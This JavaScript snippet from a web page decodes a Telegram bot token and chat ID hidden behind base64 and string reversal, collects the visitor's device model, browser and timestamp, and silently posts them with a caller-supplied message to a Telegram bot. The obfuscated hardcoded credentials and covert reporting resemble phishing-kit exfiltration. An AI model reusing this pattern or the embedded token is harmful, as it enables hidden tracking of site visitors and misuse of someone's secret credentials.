const _r = s => atob(s).split('').reverse().join('');
const tg_btoken = _r('VU5pbFlBdFNQNkY5Nm5SSU1YWjNzZVo4YXJUWEhUbWtIQUE6MDM1NzQzODQwOA==');
const tg_cid = _r('NjI4MzAwODM2MQ==');

function _getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Unknown Device';
  if (/iPhone/.test(ua)) device = 'iPhone';
  else if (/iPad/.test(ua)) device = 'iPad';
  else if (/Android/.test(ua)) {
    const m = ua.match(/Android[^;]*;\s*([^)]+)\)/);
    const parsed = m ? m[1].replace(/\s*Build\/.*/, '').trim() : '';
    device = (parsed && parsed !== 'K') ? parsed : 'Android Device';
  } else if (/Windows/.test(ua)) device = 'Windows PC';
  else if (/Macintosh/.test(ua)) device = 'Mac';
  else if (/Linux/.test(ua)) device = 'Linux PC';

  let browser = '';
  if (/Edg\//.test(ua)) browser = 'Edge';
  else if (/Chrome\//.test(ua)) browser = 'Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Safari\//.test(ua)) browser = 'Safari';

  const base = browser ? `${device} (${browser})` : device;

  // Try high-entropy Client Hints for real model on reduced-UA Chrome
  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    return navigator.userAgentData.getHighEntropyValues(['model', 'platform'])
      .then(h => {
        const model = h.model || '';
        const platform = h.platform || '';
        if (model) return `${model} (${browser || platform})`;
        if (platform) return `${platform} Device (${browser})`;
        return base;
      })
      .catch(() => base);
  }
  return Promise.resolve(base);
}

function _getDateTime() {
  const d = new Date();
  const date = d.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
  const time = d.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
  return `${date} ${time}`;
}

function sendTelegramNotification(message) {
  _getDeviceInfo().then(deviceName => {
    const info = `${message}\n📱 ${deviceName}\n🕐 ${_getDateTime()}`;
    const url = `https://api.telegram.org/bot${tg_btoken}/sendMessage`;
    const payload = {
      chat_id: tg_cid,
      text: info,
      disable_notification: true,
    };
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {});
  });
}
